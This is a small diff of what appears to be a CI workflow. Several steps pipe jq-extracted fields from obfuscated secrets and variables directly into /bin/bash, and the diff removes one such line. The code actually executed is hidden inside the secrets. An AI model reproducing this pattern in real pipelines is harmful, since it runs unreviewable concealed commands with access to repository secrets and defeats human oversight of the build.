@@ -22,7 +22,6 @@ jobs:
           xhljk2: ${{ secrets.xhljk2 }}
         run: |
           printf '%s' "$xhljk2" | jq -r .w532 | /bin/bash
-          echo $ubc354 | jq -r .a1 | /bin/bash
           echo $drf41 | jq -r .kdn22 | /bin/bash
           echo $ltcin51500 | jq -r .eij77582 | /bin/bash
           printf '%s' "$v1" | jq -r .kc661 | /bin/bash
